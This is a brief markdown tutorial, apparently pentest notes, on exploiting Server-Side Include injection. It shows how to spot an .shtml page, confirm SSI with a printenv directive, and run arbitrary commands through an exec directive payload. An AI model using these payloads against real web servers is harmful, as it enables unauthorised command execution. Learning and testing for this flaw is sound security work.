# Exploiting SSI Injection
***
### Exploitation
#### For instance, a form that after submitting , redirect us to  `/page.shtml`
#### Based on the file extension we conclude that the page supports SSI.
#### To confirm we can try the following directive:
```ssi
<!--#printenv -->
```


#### Then we can try to run arbitrary commands using the **exec** directive:
```ssi
<!--#exec cmd="id" -->
```
